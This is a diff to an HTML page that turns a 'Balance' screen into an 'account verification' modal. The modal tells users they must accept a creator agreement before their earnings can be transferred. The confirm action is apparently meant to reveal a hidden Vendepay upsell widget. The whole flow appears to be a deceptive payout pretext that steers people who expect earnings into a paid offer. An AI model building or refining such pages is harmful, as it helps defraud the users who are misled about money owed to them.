@@ -365,9 +365,13 @@
     }
 
     .app-screen {
+      display: flex;
       width: 100%;
       min-height: 100vh;
-      background: #ffffff;
+      align-items: center;
+      justify-content: center;
+      padding: max(20px, env(safe-area-inset-top)) 16px max(20px, env(safe-area-inset-bottom));
+      background: #f7f7f8;
       opacity: 0;
       visibility: hidden;
       transition: opacity 180ms ease;
@@ -378,42 +382,128 @@
       visibility: visible;
     }
 
-    .app-header {
-      min-height: calc(52px + env(safe-area-inset-top));
-      padding: env(safe-area-inset-top) 16px 0;
-      border-bottom: 1px solid var(--divider);
+    .terms-modal {
+      width: min(92vw, 448px);
+      padding: 26px;
+      border: 1px solid #e7e7e9;
+      border-radius: 14px;
       background: #ffffff;
+      box-shadow: 0 12px 34px rgba(18, 18, 18, 0.08);
     }
 
-    .app-header h1 {
-      display: flex;
-      min-height: 52px;
-      align-items: center;
-      justify-content: center;
-      margin: 0;
-      font-size: 17px;
-      font-weight: 700;
-      line-height: 1;
-    }
-
-    .content {
-      width: min(100%, 420px);
-      margin: 0 auto;
-      padding: 24px 20px max(32px, env(safe-area-inset-bottom));
-    }
-
-    .message {
-      margin: 0 0 24px;
+    .terms-title {
+      margin: 0 0 12px;
       color: var(--text);
-      font-size: 16px;
+      font-size: 23px;
       font-weight: 700;
+      line-height: 1.25;
+    }
+
+    .terms-copy {
+      margin: 0;
+      color: #3f3f46;
+      font-size: 16px;
       line-height: 1.5;
     }
 
-    #vendepay-upsell-container {
+    .terms-helper {
+      margin: 8px 0 22px;
+      color: #71717a;
+      font-size: 13px;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+
+    .agreement-control {
+      display: grid;
+      grid-template-columns: 20px minmax(0, 1fr);
+      gap: 11px;
+      align-items: start;
+      margin: 0 0 24px;
+    }
+
+    .agreement-checkbox {
+      width: 18px;
+      height: 18px;
+      margin: 2px 0 0;
+      accent-color: var(--pink);
+      cursor: pointer;
+    }
+
+    .agreement-label {
+      color: #27272a;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .agreement-label label {
+      cursor: pointer;
+    }
+
+    .terms-link {
+      display: inline;
+      padding: 0;
+      border: 0;
+      border-radius: 2px;
+      background: transparent;
+      color: #27272a;
+      font: inherit;
+      font-weight: 600;
+      text-decoration: underline;
+      text-decoration-thickness: 1px;
+      text-underline-offset: 2px;
+      cursor: pointer;
+    }
+
+    .terms-actions {
+      display: grid;
+      gap: 4px;
+    }
+
+    .confirm-button,
+    .cancel-button {
+      width: 100%;
+      border-radius: 8px;
+      font: inherit;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .confirm-button {
+      min-height: 50px;
+      border: 1px solid var(--pink);
+      background: var(--pink);
+      color: #ffffff;
+      transition: background-color 150ms ease, border-color 150ms ease, color 150ms ease;
+    }
+
+    .confirm-button:disabled {
+      border-color: #e4e4e7;
+      background: #e4e4e7;
+      color: #a1a1aa;
+      cursor: not-allowed;
+    }
+
+    .cancel-button {
+      min-height: 42px;
+      border: 0;
+      background: transparent;
+      color: #52525b;
+    }
+
+    .agreement-checkbox:focus-visible,
+    .terms-link:focus-visible,
+    .confirm-button:focus-visible,
+    .cancel-button:focus-visible {
+      outline: 3px solid rgba(254, 44, 85, 0.25);
+      outline-offset: 3px;
+    }
+
+    #vendepay-upsell-container:not([hidden]) {
       width: 100%;
       min-width: 0;
-      margin: 0 auto;
+      margin: 16px auto 0;
       overflow: visible;
     }
 
@@ -425,10 +515,15 @@
       border: 0;
     }
 
-    @media (min-width: 421px) {
+    @media (max-width: 359px) {
       .app-screen {
-        max-width: 420px;
-        margin: 0 auto;
+        padding-right: 12px;
+        padding-left: 12px;
+      }
+
+      .terms-modal {
+        width: 100%;
+        padding: 24px;
       }
     }
 
@@ -456,14 +551,30 @@
   </div>
 
   <main class="app-screen" id="appScreen" aria-hidden="true">
-    <header class="app-header">
-      <h1>Balance</h1>
-    </header>
+    <section class="terms-modal" role="dialog" aria-modal="true" aria-labelledby="termsTitle" aria-describedby="termsCopy termsHelper">
+      <h1 class="terms-title" id="termsTitle">Complete account verification</h1>
+      <p class="terms-copy" id="termsCopy">Before your earnings can be transferred, you must review and accept the Creator Service Agreement and Distribution Terms.</p>
+      <p class="terms-helper" id="termsHelper">Required to receive payouts</p>
 
-    <section class="content" aria-label="Profile synchronization">
-      <p class="message">To finalize the transfer to your linked account, please acknowledge that you agree with the standard Creator Service Agreement and terms of distribution.</p>
+      <div class="agreement-control">
+        <input class="agreement-checkbox" id="termsAgreement" type="checkbox" aria-labelledby="agreementText">
+        <div class="agreement-label" id="agreementText">
+          <label for="termsAgreement">I have read and agree to the</label>
+          <button class="terms-link" id="creatorServiceAgreementLink" type="button">Creator Service Agreement</button>
+          and
+          <button class="terms-link" id="distributionTermsLink" type="button">Distribution Terms</button>.
+        </div>
+      </div>
 
-      <div id="vendepay-upsell-container"></div>
+      <div class="terms-actions">
+        <!-- Connect the existing confirmation action to this button. -->
+        <button class="confirm-button" id="confirmTermsButton" type="button" disabled aria-disabled="true">Confirm &amp; Continue</button>
+        <!-- Connect the existing cancellation action to this button. -->
+        <button class="cancel-button" id="cancelTermsButton" type="button">Cancel</button>
+      </div>
+
+      <!-- Keep the Vendepay integration mounted; reveal it from the confirmation action when connected. -->
+      <div id="vendepay-upsell-container" hidden></div>
       <script src="https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=0ef69323-3f84-44af-bfa5-6d6987881c1c" onload="window.trackUp1Event && window.trackUp1Event('up1_widget_script_loaded'); window.VendepayUpsellWidget && window.VendepayUpsellWidget.showIframe('vendepay-upsell-container')"></script>
     </section>
   </main>
@@ -472,6 +583,14 @@
     (function () {
       var loadingScreen = document.getElementById("loadingScreen");
       var appScreen = document.getElementById("appScreen");
+      var termsAgreement = document.getElementById("termsAgreement");
+      var confirmTermsButton = document.getElementById("confirmTermsButton");
+
+      termsAgreement.addEventListener("change", function () {
+        var isAccepted = termsAgreement.checked;
+        confirmTermsButton.disabled = !isAccepted;
+        confirmTermsButton.setAttribute("aria-disabled", String(!isAccepted));
+      });
 
       window.setTimeout(function () {
         loadingScreen.classList.add("is-hidden");
